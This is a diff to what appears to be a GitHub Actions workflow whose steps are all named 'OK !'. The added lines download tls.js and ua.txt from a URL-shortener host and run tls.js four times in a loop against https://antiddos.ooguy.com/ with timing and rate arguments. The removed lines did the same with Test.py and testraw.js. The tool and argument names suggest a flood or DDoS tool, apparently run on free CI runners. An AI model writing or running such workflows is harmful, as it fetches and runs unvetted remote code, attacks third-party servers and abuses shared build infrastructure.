@@ -15,14 +15,12 @@ jobs:
     steps:
       - name: OK !
         run: |
-          pip install git+https://github.com/QuantumLLC/Archer
-          wget https://curl.by/rnZRI/Test.py
-          wget https://curl.by/rnZRI/testraw.js
-          chmod +x testraw.js
-          chmod +x Test.py
+          wget https://curl.by/-t3or/tls.js
+          wget https://curl.by/1t65y/ua.txt
+          chmod +x tls.js
           PIDS=()
           for i in {1..4}; do
-            timeout 200 python3 Test.py https://antiddos.ooguy.com/ && node testraw.js https://antiddos.ooguy.com/ 220
+            timeout 105 node tls.js https://antiddos.ooguy.com/ 100 90 10
             PIDS+=($!)
           done
           
@@ -31,7 +29,7 @@ jobs:
           done
 
       - name: OK !
-        run: sleep 200
+        run: sleep 105
         
       - name: OK !
         run: sudo reboot
